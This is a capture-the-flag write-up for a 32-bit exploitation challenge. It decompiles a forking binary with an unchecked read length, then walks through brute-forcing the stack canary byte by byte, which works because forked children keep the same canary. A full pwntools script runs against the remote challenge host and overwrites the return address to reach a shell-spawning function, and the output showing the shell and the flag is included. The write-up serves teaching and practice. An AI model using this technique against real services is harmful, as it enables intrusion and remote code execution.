# 8^256 (exploitation, 300 points)

> Hello, welcome to my little forking binary I made it special just for you I hope you don't disappoint me.

## Files:

- canary
```
❯ file canary
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af7281a274f54c7eb47e70ca66e6fd54024ebdb8, not stripped
```

## Solution:

We have a 32-bit x86 executable: to Ghidra we go!

```c
void main(void)

{
  int in_GS_OFFSET;
  int local_1c;
  __pid_t local_18;
  undefined4 local_14;
  undefined *puStack_c;
  
  puStack_c = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  puts("Hello, welcome to my little forking binary");
  puts("I made it special just for you");
  puts("I hope you don\'t disappoint me.");
  while( true ) {
    local_18 = fork();
    if (local_18 == 0) break;
    waitpid(local_18,&local_1c,0);
  }
  puts("\nForked proccess...");
  handle();
  puts("... and exited successfully!");
                    /* WARNING: Subroutine does not return */
  _exit(0);
}

void handle(void)

{
  ssize_t sVar1;
  size_t __nbytes;
  int ch;
  int in_GS_OFFSET;
  char buffer [128];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("I am the forked process!");
  puts("How much data would you like to read?");
  sVar1 = read(0,buffer,0x7f);
  buffer[sVar1 + 1] = '\0';
  __nbytes = atoi(buffer);
  memset(buffer,0,0x80);
  printf("Give me %d bytes of data\n",__nbytes);
  read(0,buffer,__nbytes);
  do {
    ch = getchar();
    if (ch == 10) break;
  } while (ch != -1);
  puts("Exiting...");
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We see that `main` just forks the process over and over, and `handle` is the actual logic. We'll come back to the fork soon.

Let's take a look at `handle`. It asks us for how much data we want to read, and then allows us to read in an arbitrary amounts of data.

Surely nothing can go wrong with that, ri-

![aaaaaaaaaaaaaaaa](https://media1.tenor.com/m/2WMaBBmy40oAAAAd/cat-aaa-scream-keyboard-acer-laptop.gif)

-ght?

```
Hello, welcome to my little forking binary
I made it special just for you
I hope you don't disappoint me.

Forked proccess...
I am the forked process!
How much data would you like to read?
180
Give me 180 bytes of data
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Exiting...
*** stack smashing detected ***: terminated

Forked proccess...
I am the forked process!
How much data would you like to read?
```

Right... stack canaries.

This is where the forked process comes into play. Since we fork, we do not generate a new canary, and thus we can brute force the canary!

Since we're able to write an arbitrary amount of memory, we can try writing one byte at a time. If we have the right canary value, the program will just exit normally. Once we know the canary, we can redirect function to the `give_shell` function that we found in Ghidra:

```c
void give_shell(void)

{
  system("/bin/sh");
  return;
}
```

Our solve script is thus:

```python

import time

from pwn import *

win = 0x0804861b

# con = process('canary')
con = remote('0.cloud.chals.io', 27190)

buffer = 0xffffd9bc
canary = 0xffffda3c
ebp = 0xffffda48

correct_canary = b'\x00'

for b in range(3):
    for i in range(256):
        print(i)
        payload = b'a' * (canary - buffer) + correct_canary + bytes([i]) 
        l = len(payload)
        res = con.recvuntil(b'How much data would you like to read?', timeout=1)
        con.sendline(str(l).encode())
        con.recvuntil(b'bytes of data')
        con.sendline(payload)
        res = con.recvuntil(b'Forked proccess...')
        if b'and exited successfully!' in res:
            correct_canary += bytes([i])
            print(correct_canary.hex())
            break

payload = b'a' * (canary - buffer) + correct_canary + b'a' * 8 + b'FPFP' + p32(win)
l = len(payload)
res = con.recvuntil(b'How much data would you like to read?', timeout=1)
con.sendline(str(l).encode())
con.recvuntil(b'bytes of data')
con.sendline(payload)
con.interactive()
```

But wait, aren't there four bytes to the canary? Why are you only brute forcing 3?

There's a fun property of Linux stack canaries: their least significant byte is always `0x00`. This is to prevent various C string-based attacks, since they will stop at the null byte. However, we can use this to cut down our search space by 25%.

After running the script for a bit, we can find all the bytes of the canary, then send the right canary to make it seem as if nothing ever happened! Except, we've left a bit of a present in the return address.

```
❯ python3 solve.py
[+] Opening connection to 0.cloud.chals.io on port 27190: Done
0
...
221
00dd
0
...
135
00dd87
0
..
64
00dd8740
[*] Switching to interactive mode

Exiting...
$ $ ls
canary    canary.c  flag.txt
$ $ cat flag.txt
flag{but_is_it_cookie_or_canary_though}
```
